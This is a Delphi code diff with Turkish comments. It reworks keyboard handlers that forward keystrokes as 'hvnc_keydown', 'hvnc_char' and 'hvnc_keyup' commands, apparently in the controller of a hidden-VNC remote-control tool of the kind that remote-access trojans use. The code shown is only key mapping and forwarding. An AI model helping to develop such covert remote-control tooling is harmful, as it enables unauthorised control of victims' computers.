@@ -731,51 +731,52 @@ end;
 procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word;
   Shift: TShiftState);
 var
-  OriginalKey: Word;
+  VK: Word;
   CharCode: Word;
 begin
   if not FPaintBoxActive then Exit;
 
-  OriginalKey := Key;
+  VK := Key;
+
+  // Sol/Sağ ayrımı (Ctrl, Alt, Shift)
+  case VK of
+    VK_SHIFT:   if (GetKeyState(VK_RSHIFT) < 0)   then VK := VK_RSHIFT   else VK := VK_LSHIFT;
+    VK_CONTROL: if (GetKeyState(VK_RCONTROL) < 0) then VK := VK_RCONTROL else VK := VK_LCONTROL;
+    VK_MENU:    if (GetKeyState(VK_RMENU) < 0)    then VK := VK_RMENU    else VK := VK_LMENU;
+  end;
+
+  // Önce her zaman keydown gönder (kısayollar için: Ctrl+C vb.)
+  SendControlCommand('hvnc_keydown', -1, -1, -1, VK, True);
+
+  // Eğer karakter üretiyorsa ayrıca hvnc_char gönder (AltGr ve Kısayol desteği için önemli)
+  if GetCharFromKey(Key, CharCode) then
+  begin
+    if CharCode > 0 then
+      SendControlCommand('hvnc_char', -1, -1, -1, CharCode, True);
+  end;
 
   // Enter / Space'in UI butonunu tetiklemesini engelle
   if (Key = VK_RETURN) or (Key = VK_SPACE) then
     Key := 0;
-
-  if GetCharFromKey(OriginalKey, CharCode) then
-  begin
-    // Yalnızca yazdırılabilir karakterleri (boşluk dahil >= 32) hvnc_char gönder
-    if CharCode >= 32 then
-    begin
-      SendControlCommand('hvnc_char', -1, -1, -1, CharCode, True);
-      Include(FCharKeyDown, OriginalKey);
-    end
-    else
-    begin
-      // Enter, Tab gibi kontrol karakterlerini normal tuş olarak gönder
-      SendControlCommand('hvnc_keydown', -1, -1, -1, OriginalKey, True);
-    end;
-  end
-  else
-  begin
-    // Ok tuşları, F1-F12, Shift, Ctrl, Alt vb.
-    SendControlCommand('hvnc_keydown', -1, -1, -1, OriginalKey, True);
-  end;
 end;
 
 procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word;
   Shift: TShiftState);
+var
+  VK: Word;
 begin
   if not FPaintBoxActive then Exit;
 
-  // Eğer tuş hvnc_char ile gönderildiyse keyup atlanır
-  if Key in FCharKeyDown then
-  begin
-    Exclude(FCharKeyDown, Key);
-    Exit;
+  VK := Key;
+
+  // KeyUp anında GetKeyState bazen yanıltıcı olabilir ama deniyoruz
+  case VK of
+    VK_SHIFT:   if (GetKeyState(VK_RSHIFT) < 0)   then VK := VK_RSHIFT   else VK := VK_LSHIFT;
+    VK_CONTROL: if (GetKeyState(VK_RCONTROL) < 0) then VK := VK_RCONTROL else VK := VK_LCONTROL;
+    VK_MENU:    if (GetKeyState(VK_RMENU) < 0)    then VK := VK_RMENU    else VK := VK_LMENU;
   end;
 
-  SendControlCommand('hvnc_keyup', -1, -1, -1, Key, True);
+  SendControlCommand('hvnc_keyup', -1, -1, -1, VK, True);
 end;
 
 procedure TForm10.FormKeyPress(Sender: TObject; var Key: Char);
